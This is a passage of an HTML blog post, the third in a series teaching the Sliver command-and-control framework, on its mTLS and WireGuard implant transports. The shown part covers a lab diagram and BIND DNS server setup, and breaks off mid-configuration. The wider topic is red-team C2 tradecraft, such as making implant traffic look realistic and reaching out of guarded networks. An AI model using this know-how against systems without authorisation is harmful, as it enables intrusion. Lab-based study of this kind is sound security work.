@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.101.0" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learning Sliver C2 (03) - Transports in Detail: mTLS and WireGuard | text/plain</title>
+    <meta name="description" content="A post about two of the four Sliver C2 protocols: mutual TLS (mTLS) and WireGuard. I&#39;ll show how to use sessions and beacons with these protocols. Using Wireshark, you will also see what kind of traffic could be observed when you deploy such implants. Like in the previous Sliver-related posts, a couple of instructions for additional lab setup are included. I&#39;ll add a DNS server to make the traffic look more realistic.
+">
+    <meta name="keywords" content="c2, sliver, red-team">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Learning Sliver C2 (03) - Transports in Detail: mTLS and WireGuard" />
+<meta property="og:description" content="A post about two of the four Sliver C2 protocols: mutual TLS (mTLS) and WireGuard. I&#39;ll show how to use sessions and beacons with these protocols. Using Wireshark, you will also see what kind of traffic could be observed when you deploy such implants. Like in the previous Sliver-related posts, a couple of instructions for additional lab setup are included. I&#39;ll add a DNS server to make the traffic look more realistic.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/" /><meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-09-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-09-07T00:00:00+00:00" />
+
+
+    
+
+
+
+  <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+      <script async src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="Learning Sliver C2 (03) - Transports in Detail: mTLS and WireGuard">
+<meta itemprop="description" content="A post about two of the four Sliver C2 protocols: mutual TLS (mTLS) and WireGuard. I&#39;ll show how to use sessions and beacons with these protocols. Using Wireshark, you will also see what kind of traffic could be observed when you deploy such implants. Like in the previous Sliver-related posts, a couple of instructions for additional lab setup are included. I&#39;ll add a DNS server to make the traffic look more realistic.
+"><meta itemprop="datePublished" content="2022-09-07T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-09-07T00:00:00+00:00" />
+<meta itemprop="wordCount" content="2125"><meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
+<meta itemprop="keywords" content="c2,sliver,red-team," />
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Learning Sliver C2 (03) - Transports in Detail: mTLS and WireGuard</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>10 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2022-09-07T00:00:00&#43;00:00">7 Sep, 2022</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">A post about two of the four Sliver C2 protocols: mutual TLS (mTLS) and WireGuard. I&#39;ll show how to use sessions and beacons with these protocols. Using Wireshark, you will also see what kind of traffic could be observed when you deploy such implants. Like in the previous Sliver-related posts, a couple of instructions for additional lab setup are included. I&#39;ll add a DNS server to make the traffic look more realistic.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#preparations">Preparations</a>
+      <ul>
+        <li><a href="#prepare-a-dns-server">Prepare a DNS server</a></li>
+        <li><a href="#configure-dns-on-target">Configure DNS on target</a></li>
+      </ul>
+    </li>
+    <li><a href="#mtls-transport-in-detail">mTLS transport in detail</a>
+      <ul>
+        <li><a href="#connection-with-working-dns-setup">Connection with working DNS setup</a></li>
+        <li><a href="#connection-with-broken-dns-setup">Connection with broken DNS setup</a></li>
+      </ul>
+    </li>
+    <li><a href="#wireguard-transport-in-detail">WireGuard transport in detail</a></li>
+    <li><a href="#bonus-section-debug-mode">Bonus section: debug mode</a></li>
+  </ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      <h1 id="sliver-c2">Sliver C2</h1>
+<h2 id="introduction">Introduction</h2>
+<p>After discussing Sliver beacon and session implants in general in <a href="../../post/learning_sliver_c2_02_beacons_and_sessions/">02 - Beacons and Sessions</a>,
+I&rsquo;ll now have a more detailed look at the four different C2 protocols you can choose from.
+This post covers the first two of them, which are mutual TLS (mTLS) and WireGuard.
+Both are strongly recommended in the official <a href="https://sliver.sh/sliver/2021/07/07/getting-started.html">Getting Started Guide</a>.
+You can expect good performance and stable connections from both, provided that they work.
+However, in cases where you try to establish a connection to your C2 server from a machine located in a well-guarded network, such connections may be blocked.
+Two other C2 protocols exist that you could use in such more restricted environments: HTTP and DNS.
+I&rsquo;ll cover those later in other posts.</p>
+<p>Like in the previous posts, I&rsquo;ll start with instructions for a lab environment extension.
+This time a DNS server is added.
+Its&rsquo; purpose for now is just to allow using DNS names instead of IP addresses for C2 endpoints,
+as you would often do on the internet.
+When we look at the C2 traffic in Wireshark, it will look more realistic this way.
+Moreover, adding this additional machine prepares the next posts about HTTP and DNS C2.
+Those posts will explore setups where the target can only communicate to the C2 server
+through a 3rd server, but not directly.
+For now though, direct connections shall be allowed.</p>
+<h2 id="preparations">Preparations</h2>
+<p>This section assumes you went through the previous posts and have a lab setup
+similar to the one described in <a href="../../post/learning_sliver_c2_02_beacons_and_sessions/">02 - Beacons and Sessions</a>.
+That is, you should have a VM for the C2 server and the target.
+The C2 server serves implant binaries with Apache on port 80
+and listens for C2 traffic on other ports.</p>
+<p>Now, we add a 3rd VM, which is called the DNS server (for now).
+It provides a DNS server and resolves <code>sliver.labnet.local</code> to the C2 server IP,
+<code>target.labnet.local</code> to the target IP, and forwards other queries to public DNS servers.
+We then configure the target to use this DNS service.
+As a result, we will be able to specify <code>sliver.labnet.local</code> as a C2 endpoint.</p>
+<p>In the end, the setup will be like this:</p>
+<pre tabindex="0"><code>+-------------------+                              +-------------------+
+|                   |                 Resolve DNS  |                   |
+|     DNS Server    +---UDP-53 &lt;-------------------+      Target       |
+|      (Linux)      |                              |     (Windows)     |
+|                   |                              |                   |
+|  192.168.122.185  |                +-------------+  192.168.122.160  |
+|                   |                |             |                   |
++-------------------+                |             +---+----------+----+
+                                     |                 |          |
+                    Download binary  |                 |          |
+                +--------------------+                 |          |
+                |                                      |          |
+                v                                      |          |
+              TCP-80                                   |          |
++---------------+---+                                  |          |
+|                   |               mTLS C2 Connection |          |
+|     C2 Server     +---TCP-8888 &lt;---------------------+          |
+|      (Linux)      |                                             |
+|                   |                 WireGuard C2 Connection     |
+|  192.168.122.111  +---UDP-53  &lt;---------------------------------+
+|                   |
++-------------------+
+</code></pre><h3 id="prepare-a-dns-server">Prepare a DNS server</h3>
+<p>There are many ways to set up DNS.
+Here I&rsquo;ll use <a href="https://en.wikipedia.org/wiki/BIND">named / BIND</a> on Debian Linux.
+You could use pretty much any DNS implenentation though.</p>
+<p>The first step is to set up a new Debian VM, e.g., from an ISO downloaded <a href="https://www.debian.org/CD/http-ftp/">here</a>.
+After that, install all the software with <code>apt-get install bind9 bind9utils bind9-doc</code>.</p>
+<p>Configuration files for BIND are in <code>/etc/bind</code>.
+You&rsquo;ll want to change the content of <code>/etc/bind/named.conf.options</code> such that it&rsquo;s similar to the following
+(IP addresses are specific to my local network and may be different in yours):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>acl &#34;localnet&#34; {
+</span></span><span style="display:flex;"><span>        192.168.122.0/24;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>options {
+</span></span><span style="display:flex;"><span>        directory &#34;/var/cache/bind&#34;;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        recursion yes;                     # resursive queries
+</span></span><span style="display:flex;"><span>        allow-recursion { localnet; };     # recursive queries
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        listen-on { 192.168.122.185; };    # IP address of the DNS server
+</span></span><span style="display:flex;"><span>        allow-transfer { none; };          # disable zone transfers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        forwarders {
+</span></span><span style="display:flex;"><span>                8.8.8.8;
+</span></span><span style="display:flex;"><span>                8.8.4.4;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        dnssec-validation auto;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        listen-on-v6 { any; };
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>logging {
+</span></span><span style="display:flex;"><span>        channel query {
+</span></span><span style="display:flex;"><span>            file &#34;/var/log/bind/query&#34; versions 5 size 10M;
+</span></span><span style="display:flex;"><span>            print-time yes;
+</span></span><span style="display:flex;"><span>            severity info;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        category queries { query; };
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>The ACL in the upper section corresponds to my personal local network,
+for which I allow recursive queries in the options section below.
+I also specify <code>192.168.122.185</code> as the IP to listen on, which is the
+IP of my new VM. Just because its a security best practice, I disallow
+zone transfers by default. Forwarders are set to public Google DNS servers,
+which will be used to resolve all queries for public internet DNS names.
+The remaining two settings regarding DNSSEC and IPv6 were in the file by
+default, so I left them there.</p>
+<p>The logging section at the bottom ensures that all DNS queries are logged to <code>var/log/bind/query</code>.
+This helps a lot to see what&rsquo;s going and to troubleshoot issues.
+Because AppArmor is installed on Debian, a small change is required
+to allow writing to this directory. First, create it:</p>
+<pre tabindex="0"><code>root@proxy:~# mkdir -p /var/log/bind
+root@proxy:~# chown bind /var/log/bind
+</code></pre><p>Now, whitelist the directory in <code>/etc/apparmor.d/usr.sbin.named</code> by adding the
+following two lines anywhere in the list:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>profile named /usr/sbin/named flags=(attach_disconnected) {
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  /var/log/bind/** rw,
+</span></span><span style="display:flex;"><span>  /var/log/bind/ rw,
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Restart AppArmor with <code>systemctl restart apparmor</code> so that changes take effect.</p>
+<p>Now create a directory with <code>mkdir -p /etc/bind/zones</code>, which will serve
+as the location for zone files. Specify the forward and reverse zones
+for the lab network in <code>/etc/bind/named.conf.local</code> like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>zone &#34;labnet.local&#34; {
+</span></span><span style="display:flex;"><span>    type master;
+</span></span><span style="display:flex;"><span>    file &#34;/etc/bind/zones/db.labnet.local&#34;;   # zone file path
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
